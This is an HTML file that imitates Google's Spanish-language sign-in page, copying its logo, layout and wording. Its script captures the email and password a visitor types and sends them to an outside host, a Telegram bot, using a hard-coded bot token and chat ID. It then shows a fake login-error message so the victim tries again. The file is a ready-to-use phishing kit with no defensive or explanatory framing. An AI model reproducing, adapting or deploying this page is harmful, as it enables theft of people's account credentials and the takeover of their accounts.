
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicia sesión - Google</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            color: #202124;
        }
        .login-container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin-top: 50px;
            text-align: center;
        }
        .logo {
            width: 75px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 40px;
        }
        .input-field {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        .input-field:focus {
            border-color: #1a73e8;
            outline: none;
        }
        .forgot-email {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            display: block;
            text-align: left;
            margin-bottom: 40px;
        }
        .guest-mode {
            font-size: 14px;
            color: #5f6368;
            text-align: left;
            margin-bottom: 40px;
        }
        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
        }
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            float: left;
        }
        .next-button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            float: right;
        }
        .next-button:hover {
            background-color: #1a66c9;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background-color: #f2f2f2;
            padding: 15px 0;
            font-size: 14px;
            color: #70757a;
            text-align: center;
        }
        .language-selector {
            display: inline-block;
            margin-top: 10px;
        }
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
        <h1>Inicia sesión</h1>
        <p class="subtitle">Utiliza tu cuenta de Google</p>

        <form id="loginForm">
            <input type="text" name="email" class="input-field" placeholder="Correo electrónico o teléfono" required>
            <input type="password" name="password" class="input-field" placeholder="Contraseña" required>

            <a href="#" class="forgot-email">¿Has olvidado tu correo electrónico?</a>
            
            <p class="guest-mode">
                ¿No es tu ordenador? Usa ventanas de navegación privada para iniciar sesión. 
                <a href="#">Más información sobre cómo usar el modo Invitado</a>
            </p>

            <div class="clearfix">
                <a href="#" class="create-account">Crear cuenta</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>
        </form>
    </div>

    <div class="footer">
        <div class="language-selector">
            Español (España)
        </div>
    </div>

    <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
        e.preventDefault();
        const email = this.email.value;
        const password = this.password.value;
        const token = "7248053498:AAH02i6SfIMxT9OblPJNgEvsko75XTy7sng"; // Reemplázalo con tu token real
        const chatId = "5942628535"; // Reemplázalo con tu chat ID

        const message = `🧠 NUEVO INTENTO DE INICIO DE SESIÓN:\n📧 Email: ${email}\n🔑 Password: ${password}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).then(response => {
            if (response.ok) {
                alert("Error al iniciar sesión, intente de nuevo.");
            } else {
                alert("Error al enviar datos.");
            }
        });
    });
    </script>
</body>
</html>
